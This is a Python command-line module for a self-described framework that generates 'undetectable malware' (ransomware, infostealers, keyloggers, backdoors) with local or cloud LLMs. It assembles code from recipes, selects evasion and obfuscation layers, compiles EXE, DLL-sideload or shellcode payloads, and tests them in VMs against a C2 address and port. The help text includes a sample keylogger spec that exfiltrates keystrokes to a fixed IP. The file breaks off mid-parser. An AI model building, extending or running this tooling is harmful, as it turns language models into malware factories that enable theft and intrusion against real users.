"""
CLI entry point for the malware generation framework.

Subcommands:
  generate     — Generate malware source code from a target spec (no VM needed)
  provision    — Provision a VM only (useful for testing the VM setup)
  verify       — Verify already-generated source against a running VM
  run          — Full pipeline: generate → provision → verify → loop
  analyze      — Run DB queries and show context without generation

Usage:
  python -m malware_gen_framework generate --spec target.yaml --output ./results
  python -m malware_gen_framework provision --os windows-11
  python -m malware_gen_framework run --spec target.yaml --max-iterations 5
"""

import argparse
import asyncio
import json
import logging
from logging.handlers import RotatingFileHandler
import os
import sys
from pathlib import Path

from .target_spec import OSPlatform, TargetEnvironmentSpec
from .spec_parser import parse_target_spec
from .config_models import VMProvisionConfig, TargetOS
from .debug_logger import DebugLogger

try:
    from .pipeline import MalwarePipeline, PipelineResult
    _HAS_PIPELINE = True
except ImportError:
    _HAS_PIPELINE = False

_LOG_DIR = Path(__file__).parent / "logs"


def _setup_logging(verbose: bool = False) -> None:
    level = logging.DEBUG if verbose else logging.INFO

    # Stdout — full verbosity as before
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )

    # File — INFO and above only, rotating at 1 MB, keep 3 backups
    _LOG_DIR.mkdir(exist_ok=True)
    file_handler = RotatingFileHandler(
        _LOG_DIR / "framework.log",
        maxBytes=1 * 1024 * 1024,
        backupCount=3,
        encoding="utf-8",
    )
    file_handler.setLevel(logging.INFO)
    file_handler.setFormatter(logging.Formatter(
        "%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    ))
    logging.getLogger().addHandler(file_handler)


# ---------------------------------------------------------------------------
# Subcommand handlers
# ---------------------------------------------------------------------------

async def cmd_generate(args) -> int:
    """Generate malware source code from a target spec."""
    if not _HAS_PIPELINE:
        print("ERROR: LLM pipeline moved to out-of-order/. Use 'chunk' subcommand instead.")
        return 1
    debug = DebugLogger(enabled=getattr(args, "debug", False))

    # Early validation — malware_type must be explicitly set in spec.yaml
    target_spec = parse_target_spec(spec_path=args.spec)
    if not target_spec.malware_type or target_spec.malware_type in ("exe", "elf"):
        print("ERROR: malware_type not set in spec.yaml. Set it to e.g. 'ransomware', 'infostealer', 'keylogger', 'backdoor'.")
        return 1

    pipeline = MalwarePipeline(
        generate=True, provision_vm=False, verify=False, retry_loop=False, debug=debug,
        run_mode=getattr(args, "mode", "local-run"),
        cloud_provider=getattr(args, "cloud_provider", "fugu"),
        cloud_model=getattr(args, "cloud_model", ""),
        llm_url=getattr(args, "llm_url", ""),
        llm_model=getattr(args, "llm_model", ""),
        plan_review_cycles=getattr(args, "plan_review_cycles", 10),
    )

    overrides = {}
    if getattr(args, "behavior", None):
        overrides["behavior_spec"] = args.behavior

    result = await pipeline.run(
        spec_path=args.spec,
        output_dir=args.output,
        **overrides,
    )

    print(result.print_summary())
    return 0


async def cmd_provision(args) -> int:
    """Provision a VM and report status. Useful for testing VM setup in isolation."""
    from .provision_engine import ProvisionEngine, QEMUProcess

    _os_map = {
        "windows-11":    TargetOS.WINDOWS_11,
        "windows-10":    TargetOS.WINDOWS_10,
        "ubuntu-24.04":  TargetOS.UBUNTU_24_04,
        "ubuntu-22.04":  TargetOS.UBUNTU_22_04,
    }
    os_type = _os_map.get(args.os)
    if not os_type:
        print(f"Unknown OS '{args.os}'. Choose from: {', '.join(_os_map)}")
        return 1

    config = VMProvisionConfig(os_type=os_type)
    config.compute_paths()

    boot_existing = getattr(args, "boot_existing", False)

    if boot_existing:
        # Boot the already-installed COW disk without re-running the installer.
        if not config.cow_img or not config.cow_img.exists():
            print(f"No existing VM disk found at {config.cow_img}")
            print(f"Run 'provision --os {args.os}' first to install the VM.")
            return 1
        ssh_port = config.network.port_fwd_ssh
        vm_user, vm_pass = "vmuser", "vmuser123"
        qemu = QEMUProcess(
            vm_name=config.vm_name % config.os_type.value,
            qmp_socket=config.qmp_socket,
            disk_img=config.cow_img,
            cpu_cores=config.resources.CPU_cores,
            ram_mb=config.resources.RAM_GB * 1024,
            windows_boot_only=True,
        )
        try:
            await qemu.start()
            print(f"\nWaiting for SSH on port {ssh_port} (timeout: 5 minutes)…")
            if not await ProvisionEngine._wait_for_ssh(
                ssh_port, timeout=300, username=vm_user, password=vm_pass
            ):
                print("SSH did not respond in 5 minutes. Is Windows fully installed?")
                await qemu.stop()
                return 1
            print(f"\nVM ready!")
            print(f"  SSH: ssh {vm_user}@localhost -p {ssh_port}")
            print(f"  Password: {vm_pass}")
            print("\nVM is running. Press Ctrl-C to stop it.")
            try:
                while True:
                    await asyncio.sleep(60)
            except KeyboardInterrupt:
                pass
            await qemu.stop()
            return 0
        except Exception as exc:
            print(f"\nFailed to boot existing VM: {exc}")
            return 1

    daemonize = not getattr(args, "no_daemonize", False)
    engine = ProvisionEngine(daemonize=daemonize)
    try:
        vm = await engine.provision(config)
        print(f"\nVM ready!")
        print(f"  SSH: ssh {vm.vm_user}@localhost -p {vm.ssh_port}")
        print(f"  Password: {vm.vm_pass}")
        if daemonize:
            print(f"\nVM is running in background (PID={vm.qemu.process.pid}).")
            print("It will stay alive after this process exits.")
            print("Use --use-existing-vm for pipeline runs.")
        else:
            print("\nVM is running. Press Ctrl-C to stop it.")
            try:
                while True:
                    await asyncio.sleep(60)
            except KeyboardInterrupt:
                pass
            await engine.shutdown_all()
        return 0
    except Exception as exc:
        print(f"\nProvisioning failed: {exc}")
        return 1


async def cmd_verify(args) -> int:
    """Verify already-generated source against a provisioned VM."""
    if not _HAS_PIPELINE:
        print("ERROR: LLM pipeline moved to out-of-order/. Use 'chunk' subcommand instead.")
        return 1
    from .provision_engine import ProvisionEngine, QEMUProcess
    debug = DebugLogger(enabled=getattr(args, "debug", False))

    # Early validation — malware_type must be explicitly set in spec.yaml
    target_spec = parse_target_spec(spec_path=args.spec)
    if not target_spec.malware_type or target_spec.malware_type in ("exe", "elf"):
        print("ERROR: malware_type not set in spec.yaml. Set it to e.g. 'ransomware', 'infostealer', 'keylogger', 'backdoor'.")
        return 1

    _use_existing = getattr(args, "use_existing_vm", False)
    _boot_existing = getattr(args, "boot_existing", False)
    if not _use_existing and getattr(args, "vm_port", None):
        _use_existing = True
    qemu = None

    if _boot_existing:
        config = VMProvisionConfig(os_type=_infer_os_from_spec(args))
        config.compute_paths()
        if not config.cow_img or not config.cow_img.exists():
            print(f"No existing VM disk found at {config.cow_img}")
            print("Run 'provision --os <os>' first to install the VM.")
            return 1
        qemu = QEMUProcess(
            vm_name=config.vm_name % config.os_type.value,
            qmp_socket=config.qmp_socket,
            disk_img=config.cow_img,
            cpu_cores=config.resources.CPU_cores,
            ram_mb=config.resources.RAM_GB * 1024,
            windows_boot_only=True,
        )
        await qemu.start()
        ssh_port = config.network.port_fwd_ssh
        print(f"Booting existing VM, waiting for SSH on port {ssh_port}…")
        _vm_user = getattr(args, "vm_user", "vmuser")
        _vm_pass = getattr(args, "vm_pass", "vmuser123")
        if not await ProvisionEngine._wait_for_ssh(
            ssh_port, timeout=600, username=_vm_user, password=_vm_pass
        ):
            print("SSH did not respond in 10 minutes.")
            await qemu.stop()
            return 1
        _use_existing = True
        args.vm_port = ssh_port

    pipeline = MalwarePipeline(
        generate=False,
        provision_vm=not _use_existing,
        verify=True,
        retry_loop=bool(getattr(args, "loop", False)),
        max_iterations=getattr(args, "max_iters", 5) if getattr(args, "loop", False) else 1,
        debug=debug,
        use_existing_vm=_use_existing,
        existing_vm_port=getattr(args, "vm_port", 10022),
        existing_vm_user=getattr(args, "vm_user", "vmuser"),
        existing_vm_pass=getattr(args, "vm_pass", "vmuser123"),
        run_mode=getattr(args, "mode", "local-run"),
        cloud_provider=getattr(args, "cloud_provider", "fugu"),
        cloud_model=getattr(args, "cloud_model", ""),
        llm_url=getattr(args, "llm_url", ""),
        llm_model=getattr(args, "llm_model", ""),
        qemu_process=qemu,
    )

    source_path = Path(args.source or "/tmp/malware_source.c")
    if not source_path.exists():
        print(f"Error: source file not found: {source_path}")
        if qemu:
            await qemu.stop()
        return 1

    try:
        result = await pipeline.run(
            spec_path=args.spec,
            output_dir=getattr(args, "output", None),
            source_file=str(source_path),
        )
    finally:
        if qemu:
            await qemu.stop()

    print(result.print_summary())
    if result.loop_result:
        print("\n" + result.loop_result.summary())

    return 0


async def cmd_run(args) -> int:
    """Full pipeline: spec → generate → provision → verify → loop."""
    if not _HAS_PIPELINE:
        print("ERROR: LLM pipeline moved to out-of-order/. Use 'chunk' subcommand instead.")
        return 1
    from .provision_engine import ProvisionEngine, QEMUProcess
    debug = DebugLogger(enabled=getattr(args, "debug", False))

    # Early validation — malware_type must be explicitly set in spec.yaml
    target_spec = parse_target_spec(spec_path=args.spec)
    if not target_spec.malware_type or target_spec.malware_type in ("exe", "elf"):
        print("ERROR: malware_type not set in spec.yaml. Set it to e.g. 'ransomware', 'infostealer', 'keylogger', 'backdoor'.")
        return 1

    _use_existing = getattr(args, "use_existing_vm", False)
    if not _use_existing and getattr(args, "vm_port", None):
        _use_existing = True
    _boot_existing = getattr(args, "boot_existing", False)

    qemu = None  # track a VM we started ourselves so we can shut it down

    if _boot_existing:
        # Start the already-installed COW disk, then treat it as an existing VM.
        config = VMProvisionConfig(os_type=_infer_os_from_spec(args))
        config.compute_paths()
        if not config.cow_img or not config.cow_img.exists():
            print(f"No existing VM disk found at {config.cow_img}")
            print("Run 'provision --os <os>' first to install the VM.")
            return 1
        qemu = QEMUProcess(
            vm_name=config.vm_name % config.os_type.value,
            qmp_socket=config.qmp_socket,
            disk_img=config.cow_img,
            cpu_cores=config.resources.CPU_cores,
            ram_mb=config.resources.RAM_GB * 1024,
            windows_boot_only=True,
        )
        await qemu.start()
        ssh_port = config.network.port_fwd_ssh
        print(f"Booting existing VM, waiting for SSH on port {ssh_port}…")
        _vm_user = getattr(args, "vm_user", "vmuser")
        _vm_pass = getattr(args, "vm_pass", "vmuser123")
        if not await ProvisionEngine._wait_for_ssh(
            ssh_port, timeout=600, username=_vm_user, password=_vm_pass
        ):
            print("SSH did not respond in 10 minutes.")
            await qemu.stop()
            return 1
        _use_existing = True
        args.vm_port = ssh_port

    pipeline = MalwarePipeline(
        generate=True,
        provision_vm=not _use_existing,
        verify=True,
        retry_loop=args.loop or args.exhaustive,
        max_iterations=getattr(args, "max_iters", 5),
        min_iterations=getattr(args, "min_iters", 1),
        exhaustive_mode=bool(getattr(args, "exhaustive", False)),
        debug=debug,
        use_existing_vm=_use_existing,
        existing_vm_port=getattr(args, "vm_port", 10022),
        existing_vm_user=getattr(args, "vm_user", "vmuser"),
        existing_vm_pass=getattr(args, "vm_pass", "vmuser123"),
        run_mode=getattr(args, "mode", "local-run"),
        cloud_provider=getattr(args, "cloud_provider", "fugu"),
        cloud_model=getattr(args, "cloud_model", ""),
        llm_url=getattr(args, "llm_url", ""),
        llm_model=getattr(args, "llm_model", ""),
        plan_review_cycles=getattr(args, "plan_review_cycles", 10),
        qemu_process=qemu,  # None unless --boot-existing; enables per-iteration snapshot resets
        resume=bool(getattr(args, "resume", False)),
    )

    overrides = {}
    if getattr(args, "behavior", None):
        overrides["behavior_spec"] = args.behavior

    try:
        result = await pipeline.run(
            spec_path=args.spec,
            output_dir=args.output,
            **overrides,
        )
    finally:
        if qemu:
            await qemu.stop()

    print(result.print_summary())
    if result.loop_result:
        print("\n" + result.loop_result.summary())

    return 0


def _infer_os_from_spec(args) -> "TargetOS":
    """Best-effort OS type from --os flag or spec file, defaulting to Windows 11."""
    _os_map = {
        "windows-11": TargetOS.WINDOWS_11,
        "windows-10": TargetOS.WINDOWS_10,
        "ubuntu-24.04": TargetOS.UBUNTU_24_04,
        "ubuntu-22.04": TargetOS.UBUNTU_22_04,
    }
    os_arg = getattr(args, "os", None)
    return _os_map.get(os_arg, TargetOS.WINDOWS_11)


async def cmd_clean(args) -> int:
    """Delete VM working files from /tmp/vm_provision/ and /tmp."""
    import shutil
    base_dir = Path("/tmp/vm_provision")
    tmp_isos = [Path("/tmp/autounattend.iso"), Path("/tmp/cloud-init.iso")]

    deleted = []
    skipped = []

    if args.all:
        # Wipe the entire working directory
        if base_dir.exists():
            shutil.rmtree(base_dir)
            deleted.append(str(base_dir) + "/ (all contents)")
    else:
        # Default: delete only COW snapshots and temp ISOs
        if base_dir.exists():
            for cow in base_dir.glob("*.cow.qcow2"):
                cow.unlink()
                deleted.append(cow.name)
            iso_gb = sum(f.stat().st_size for f in base_dir.glob("base_*.iso")) // 1024**3
            skipped = [
                f"base_*.iso  ({iso_gb} GB)",
                "virtio-*.iso",
                "OVMF_VARS_4M.fd",
            ]

    for iso in tmp_isos:
        if iso.exists():
            iso.unlink()
            deleted.append(str(iso))

    if deleted:
        print("Deleted:")
        for d in deleted:
            print(f"  {d}")
    else:
        print("Nothing to delete.")

    if skipped and not args.all:
        print("\nKept (use --all to also remove these):")
        for s in skipped:
            print(f"  {s}")

    return 0


async def cmd_portal(args) -> int:
    """Launch the web portal on localhost."""
    from .portal.app import create_app
    from aiohttp import web
    app = create_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, args.host, args.port)
    await site.start()
    print(f"\n  Portal running at  http://{args.host}:{args.port}")
    print("  Press Ctrl-C to stop.\n")
    try:
        while True:
            await asyncio.sleep(3600)
    finally:
        await runner.cleanup()
    return 0


async def cmd_chunk(args) -> int:
    """Assemble malware from chunk recipes (no LLM needed)."""
    import sys
    sys.path.insert(0, str(Path(__file__).parent / "templates" / "chunks"))
    from templates.chunks.assembler import assemble, compile_mingw, compile_zig
    from templates.chunks.evasion_selector import select_layers, config_to_recipe, format_selection_report, record_run

    recipe_dir = Path(__file__).parent / "templates" / "chunks" / "recipes"
    output_dir = Path(getattr(args, "output", "results"))
    output_dir.mkdir(parents=True, exist_ok=True)

    if args.adaptive:
        detection = getattr(args, "detection", "") or ""
        config = select_layers(detection_text=detection)
        print(format_selection_report(config))
        print()

        malware_type = getattr(args, "type", None) or "infostealer"
        recipe_yaml = config_to_recipe(config, malware_type=malware_type)

        recipe_path = output_dir / "adaptive_recipe.yaml"
        recipe_path.write_text(recipe_yaml)
        print(f"Adaptive recipe written to {recipe_path}")
    else:
        recipe_name = getattr(args, "recipe", "ad_recon_default")
        candidate = Path(recipe_name)
        if candidate.is_absolute() and candidate.exists():
            recipe_path = candidate
        else:
            recipe_path = recipe_dir / f"{recipe_name}.yaml"
            if not recipe_path.exists():
                available = [p.stem for p in recipe_dir.glob("*.yaml")]
                print(f"Recipe '{recipe_name}' not found. Available: {', '.join(available)}")
                return 1

    extra_vars = {}
    for v in getattr(args, "var", []) or []:
        if "=" in v:
            k, val = v.split("=", 1)
            extra_vars[k] = val

    import shutil
    import time

    malware_type = getattr(args, "type", None) or None
    if not malware_type:
        recipe_stem = recipe_path.stem if recipe_path else ""
        for t in ("infostealer", "keylogger", "backdoor", "ad_recon"):
            if recipe_stem.startswith(t):
                malware_type = t
                break
        if not malware_type:
            malware_type = "infostealer"
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    pkg_dir = output_dir / f"chunk_{malware_type}_{timestamp}"
    pkg_dir.mkdir(parents=True, exist_ok=True)

    src_out = pkg_dir / "source.c"
    source = assemble(str(recipe_path), extra_vars)

    obf_level = getattr(args, "obfuscate", None) or "none"
    if obf_level != "none":
        from templates.chunks.obfuscate import obfuscate as obf_fn
        source = obf_fn(source, level=obf_level)
        print(f"Obfuscated: level={obf_level}")

    src_out.write_text(source)
    print(f"Assembled: {src_out} ({len(source)} chars)")

    shutil.copy2(str(recipe_path), str(pkg_dir / "recipe.yaml"))

    parse_script = Path(__file__).parent / "scripts" / "parse_exfil.py"
    if parse_script.exists():
        shutil.copy2(str(parse_script), str(pkg_dir / "parse_exfil.py"))

    if malware_type == "keylogger":
        deploy_script = Path(__file__).parent / "scripts" / "deploy_keylogger.sh"
        if deploy_script.exists():
            shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
    elif malware_type == "backdoor":
        deploy_script = Path(__file__).parent / "scripts" / "deploy_backdoor.sh"
        if deploy_script.exists():
            shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
    elif malware_type == "infostealer":
        deploy_script = Path(__file__).parent / "scripts" / "deploy_ad_recon.sh"
        if deploy_script.exists():
            shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))

    build_info = (
        f"type: {malware_type}\n"
        f"recipe: {recipe_path.name}\n"
        f"obfuscation: {obf_level}\n"
        f"timestamp: {timestamp}\n"
        f"source_chars: {len(source)}\n"
    )

    exe_out = None
    if args.compile:
        import yaml as _yaml
        with open(recipe_path) as _rf:
            _recipe_data = _yaml.safe_load(_rf)
        _arch = _recipe_data.get("arch", "")
        _compiler = getattr(args, "compiler", "mingw") or "mingw"
        _compile_fn = compile_zig if _compiler == "zig" else compile_mingw
        dll_archs = {"arch/dll_sideload", "arch/dll_rundll", "arch/dll_cpl"}
        if _arch in dll_archs:
            _def_name = _recipe_data.get("def_file", "version.def")
            _def_path = str(Path(__file__).parent / "templates" / "chunks" / "arch" / _def_name)
            if _arch == "arch/dll_cpl":
                exe_out = pkg_dir / "payload.cpl"
            else:
                exe_out = pkg_dir / "payload.dll"
            ok = _compile_fn(str(src_out), str(exe_out), dll_def=_def_path)
        else:
            exe_out = pkg_dir / "payload.exe"
            ok = _compile_fn(str(src_out), str(exe_out))
        if not ok:
            return 1
        build_info += f"binary_size: {exe_out.stat().st_size}\n"

    if getattr(args, "format", "exe") == "shellcode" and exe_out and exe_out.exists():
        from templates.chunks.assembler import extract_shellcode
        sc_out = pkg_dir / "payload.bin"
        if extract_shellcode(str(exe_out), str(sc_out)):
            build_info += f"shellcode_size: {sc_out.stat().st_size}\n"

    rc = 0
    c2_port = os.environ.get("C2_PORT", extra_vars.get("C2_PORT", "9001"))
    c2_ip = extra_vars.get("C2_IP", "10.0.2.2")

    if args.test:
        import subprocess
        scripts_dir = Path(__file__).parent / "scripts"
        if malware_type == "keylogger":
            test_script = scripts_dir / "deploy_keylogger.sh"
        elif malware_type == "backdoor":
            test_script = scripts_dir / "deploy_backdoor.sh"
        elif malware_type == "infostealer":
            test_script = scripts_dir / "deploy_ad_recon.sh"
        else:
            test_script = scripts_dir / "test_template.sh"
        if not test_script.exists():
            print(f"{test_script.name} not found — skipping VM test")
        else:
            test_input = str(exe_out) if exe_out and exe_out.exists() else str(src_out)
            test_env = os.environ.copy()
            test_env["C2_RESULTS_DIR"] = str(pkg_dir)
            if malware_type == "keylogger":
                cmd = ["bash", str(test_script), test_input, c2_port]
            elif malware_type == "backdoor":
                cmd = ["bash", str(test_script), test_input, c2_ip, c2_port]
            elif malware_type == "infostealer":
                cmd = ["bash", str(test_script), test_input]
            else:
                cmd = ["bash", str(test_script)]
                if args.snapshot:
                    cmd.append("--snapshot")
                cmd.extend([test_input, c2_ip, c2_port])
            rc = subprocess.run(cmd, env=test_env).returncode
            build_info += f"vm_test: {'PASS' if rc == 0 else 'FAIL'}\n"

            for f in pkg_dir.glob("exfil_*.bin"):
                build_info += f"exfil: {f.name} ({f.stat().st_size} bytes)\n"

    (pkg_dir / "build_info.txt").write_text(build_info)

    # Symlink results/latest -> this package for convenience
    latest = output_dir / "latest"
    if latest.is_symlink() or latest.exists():
        latest.unlink()
    latest.symlink_to(pkg_dir.name)

    print(f"Package: {pkg_dir}/")
    return rc


async def cmd_analyze(args) -> int:
    """Run DB queries and show the context without generating code."""
    debug = DebugLogger(enabled=getattr(args, "debug", False))
    from .spec_parser import parse_target_spec
    from .db_query_engine import DBQueryEngine
    from .context_builder import ContextBuilder

    overrides = {}
    if getattr(args, "malware_type", None):
        overrides["malware_type"] = args.malware_type
    if getattr(args, "behavior", None):
        overrides["behavior_spec"] = args.behavior

    target_spec = parse_target_spec(spec_path=args.spec, **overrides)
    db = DBQueryEngine()
    cb = ContextBuilder()

    query_result = db.query_all(
        f"{target_spec.os_platform.value} {target_spec.os_version}",
        n_results=getattr(args, "db_n", 10),
    )

    context = cb.build_context(query_result, target_spec)

    print(f"Target: {context.target_summary}")
    print(f"\nRanked techniques ({len(context.techniques)}):")
    for t in context.techniques:
        print(f"  [{t.rank_score:.1f}] {t.technique.name} (det={t.technique.detection_rating})")

    print(f"\nRanked PoCs ({len(context.pocs)}):")
    for p in context.pocs:
        print(f"  [{p.rank_score:.1f}] {p.poc.title} ({p.poc.cve})")

    return 0


# ---------------------------------------------------------------------------
# CLI argument parser
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="malware_gen_framework",
        description="Malware-on-demand framework — generate undetectable malware for target environments",
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable debug logging")
    parser.add_argument("--debug", action="store_true", help="Real-time pipeline debugging mode (step-by-step trace)")

    subparsers = parser.add_subparsers(dest="command", required=True)

    # -- generate -----------------------------------------------------------
    gen_parser = subparsers.add_parser("generate", help="Generate malware source code")
    gen_parser.add_argument("--spec", required=True, help="Path to target spec (YAML/JSON)")
    gen_parser.add_argument("--output", "-o", help="Output directory for generated files")
    gen_parser.add_argument(
        "--behavior",
        default=None,
        metavar="SPEC",
        help="Detailed behavioral requirements passed verbatim to the LLM "
             "(e.g. \"keylogger that sends all keystrokes to 10.0.0.5:9001 over AES-256 TCP, "
             "persists via HKCU Run key\"); overrides spec.yaml if set",
    )
    gen_parser.add_argument(
        "--mode",
        choices=["local-run", "cloud-run"],
        default="local-run",
        help="local-run: local LLM for everything (default). cloud-run: chunk code gen via cloud provider; orchestration stays local.",
    )
    gen_parser.add_argument(
        "--cloud-provider", choices=["fugu", "openrouter"], default="fugu",
        help="Cloud LLM provider for cloud-run mode (default: fugu). fugu=Sakana AI (FUGU_API_KEY). openrouter=OpenRouter (OPENROUTER_API_KEY).",
    )
    gen_parser.add_argument(
        "--cloud-model", default="",
        help="Override the cloud provider's default model (e.g. deepseek/deepseek-r1-0528 for openrouter).",
    )
    gen_parser.add_argument(
        "--llm-url", default="",
        help="Local LLM API base URL (default: http://localhost:11235). Use to point at a remote LM Studio endpoint.",
    )
    gen_parser.add_argument(
        "--llm-model", default="",
        help="Override the local LLM model name sent to LM Studio (default: uses whatever is loaded).",
    )
    gen_parser.add_argument(
        "--plan-review-cycles", type=int, default=10,
        help="Max plan review/revision cycles (default: 10). 0 = loop until the plan is approved.",
    )

    # -- provision ----------------------------------------------------------
    prov_parser = subparsers.add_parser(
        "provision",
        help="Provision a VM only (test VM setup)",
        description=(
            "Boot a VM and hold it alive for SSH inspection. Useful for verifying that "
            "the auto-setup ISO (cloud-init / autounattend) works correctly before running "
            "the full pipeline.\n\n"
            "Windows: place the ISO in ~/llm_vault/isos/windows-11.iso (or windows-10.iso) "
            "before running. Download with wget — the URL must be in single quotes because "
            "it contains & characters:\n\n"
            "  wget -O ~/llm_vault/isos/windows-11.iso 'https://...FULL_URL...'\n\n"
            "Override the ISO directory with: ISO_DIR=/path/to/dir"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    prov_parser.add_argument(
        "--os",
        choices=["windows-11", "windows-10", "ubuntu-24.04", "ubuntu-22.04"],
        default="windows-11",
        help="OS to provision (default: windows-11)",
    )
    prov_parser.add_argument(
        "--boot-existing", action="store_true",
        help="Boot an already-installed VM disk without re-running the installer",
    )
    prov_parser.add_argument(
        "--no-daemonize", action="store_true", dest="no_daemonize",
        help="Don't daemonize — block until Ctrl-C then kill VM (old behavior)",
    )

    # -- verify -------------------------------------------------------------
    ver_parser = subparsers.add_parser("verify", help="Verify malware in a VM")
    ver_parser.add_argument("--spec", required=True, help="Path to target spec")
    ver_parser.add_argument("--source", "-s", help="Path to source code file (default: /tmp/malware_source.c)")
    ver_parser.add_argument("--loop", action="store_true", help="Enable retry loop after first verification")
    ver_parser.add_argument("--max-iters", type=int, default=5, help="Max retry iterations (default: 5)")
    ver_parser.add_argument(
        "--mode", choices=["local-run", "cloud-run"], default="local-run",
        help="local-run: local LLM for everything (default). cloud-run: chunk code gen via cloud provider.",
    )
    ver_parser.add_argument(
        "--cloud-provider", choices=["fugu", "openrouter"], default="fugu",
        help="Cloud LLM provider for cloud-run mode (default: fugu).",
    )
    ver_parser.add_argument(
        "--cloud-model", default="",
        help="Override the cloud provider's default model.",
    )
    ver_parser.add_argument(
        "--llm-url", default="",
        help="Local LLM API base URL (default: http://localhost:11235).",
    )
    ver_parser.add_argument(
        "--llm-model", default="",
        help="Override the local LLM model name sent to LM Studio.",
    )
    ver_parser.add_argument("--use-existing-vm", action="store_true",
        help="Skip provisioning and use an already-running VM")
    ver_parser.add_argument("--boot-existing", action="store_true",
        help="Boot the already-installed VM disk, verify, then shut it down")
    ver_parser.add_argument("--vm-port", type=int, default=10022,
        help="SSH port of the existing VM (default: 10022)")
    ver_parser.add_argument("--vm-user", default="vmuser",
        help="SSH username for the existing VM (default: vmuser)")
    ver_parser.add_argument("--vm-pass", default="vmuser123",
        help="SSH password for the existing VM (default: vmuser123)")

    # -- run ----------------------------------------------------------------
    run_parser = subparsers.add_parser(
        "run",
        help="Full pipeline: generate → provision → verify → loop",
        description=(
            "Full pipeline: generate source code → provision VM → verify → retry loop.\n\n"
            "Windows targets require the ISO to be placed manually before running:\n"
            "  ~/llm_vault/isos/windows-11.iso   (or windows-10.iso)\n\n"
            "Download with wget — wrap the URL in single quotes (it contains & characters\n"
            "that the shell would otherwise treat as background-job separators):\n\n"
            "  wget -O ~/llm_vault/isos/windows-11.iso 'https://...FULL_URL...'\n\n"
            "Override the ISO directory with: ISO_DIR=/path/to/dir\n"
            "Linux targets (ubuntu-24.04, ubuntu-22.04) download their image automatically."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    run_parser.add_argument("--spec", required=True, help="Path to target spec (YAML/JSON)")
    run_parser.add_argument("--output", "-o", help="Output directory")
    run_parser.add_argument(
        "--behavior",
        default=None,
        metavar="SPEC",
        help="Detailed behavioral requirements passed verbatim to the LLM "
             "(e.g. \"keylogger that sends all keystrokes to 10.0.0.5:9001 over AES-256 TCP, "
             "persists via HKCU Run key\"); overrides spec.yaml if set",
    )
    run_parser.add_argument(
        "--mode",
        choices=["local-run", "cloud-run"],
        default="local-run",
        help="local-run: local LLM for everything (default). cloud-run: chunk code gen via cloud provider; orchestration stays local.",
    )
    run_parser.add_argument(
        "--cloud-provider", choices=["fugu", "openrouter"], default="fugu",
        help="Cloud LLM provider for cloud-run mode (default: fugu). fugu=Sakana AI (FUGU_API_KEY). openrouter=OpenRouter (OPENROUTER_API_KEY).",
    )
    run_parser.add_argument(
        "--cloud-model", default="",
        help="Override the cloud provider's default model (e.g. deepseek/deepseek-r1-0528 for openrouter).",
    )
    run_parser.add_argument(
        "--llm-url", default="",
        help="Local LLM API base URL (default: http://localhost:11235). Use to point at a remote LM Studio endpoint.",
    )
    run_parser.add_argument(
        "--llm-model", default="",
        help="Override the local LLM model name sent to LM Studio.",
    )
    run_parser.add_argument(
        "--plan-review-cycles", type=int, default=10,
        help="Max plan review/revision cycles (default: 10). 0 = loop until the plan is approved.",
    )
    run_parser.add_argument("--resume", action="store_true",
        help="Resume from last checkpoint (requires --output dir with checkpoint.json)")
    run_parser.add_argument("--max-iters", type=int, default=5)
    run_parser.add_argument("--min-iters", type=int, default=1)
    run_parser.add_argument("--exhaustive", action="store_true", help="Run until all techniques exhausted")
    run_parser.add_argument("--loop", action="store_true", help="Enable retry loop")
    run_parser.add_argument("--use-existing-vm", action="store_true",
        help="Skip provisioning and attach to an already-running VM on --vm-port")
    run_parser.add_argument("--boot-existing", action="store_true",
        help="Boot the already-installed VM disk, run the pipeline, then shut it down")
    run_parser.add_argument("--vm-port", type=int, default=10022,
        help="SSH port of the existing VM (default: 10022)")
    run_parser.add_argument("--vm-user", default="vmuser",
        help="SSH username for the existing VM (default: vmuser)")
    run_parser.add_argument("--vm-pass", default="vmuser123",
        help="SSH password for the existing VM (default: vmuser123)")

    # -- clean --------------------------------------------------------------
    clean_parser = subparsers.add_parser(
        "clean",
        help="Delete VM working files without running anything",
        description=(
            "Delete VM working files from /tmp/vm_provision/ and /tmp.\n\n"
            "Default (no flags): removes COW disk snapshots and temp ISOs only.\n"
            "  Kept: base OS ISO copy, VirtIO ISO, OVMF_VARS — reused by next provision run.\n\n"
            "--all: wipes /tmp/vm_provision/ entirely. Next provision will re-copy the\n"
            "  Windows ISO (~8 GB) and re-download VirtIO drivers (~750 MB)."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    clean_parser.add_argument(
        "--all", action="store_true",
        help="Remove everything including base ISO copies and VirtIO drivers",
    )

    # -- portal -------------------------------------------------------------
    portal_parser = subparsers.add_parser(
        "portal",
        help="Launch the web portal on localhost (default: http://127.0.0.1:7070)",
    )
    portal_parser.add_argument("--port", type=int, default=7070, help="Port to listen on (default: 7070)")
    portal_parser.add_argument("--host", default="127.0.0.1", help="Host to bind to (default: 127.0.0.1)")

    # -- chunk --------------------------------------------------------------
    chunk_parser = subparsers.add_parser(
        "chunk",
        help="Assemble malware from chunk recipes (no LLM needed)",
    )
    chunk_parser.add_argument("--recipe", default="ad_recon_default", help="Recipe name (default: ad_recon_default)")
    chunk_parser.add_argument("--adaptive", action="store_true", help="Use evasion_selector to pick layers adaptively")
    chunk_parser.add_argument("--type", default=None, help="Malware type (auto-detected from recipe name if not set)")
    chunk_parser.add_argument("--detection", default="", help="Detection feedback for adaptive mode (e.g. 'Trojan:Win32/Stealer')")
    chunk_parser.add_argument("--compile", action="store_true", help="Also compile with MinGW")
    chunk_parser.add_argument("--compiler", choices=["mingw", "zig"], default="mingw",
                              help="Compiler toolchain (default: mingw)")
    chunk_parser.add_argument("--test", action="store_true", help="Deploy and test on VM (implies --compile)")
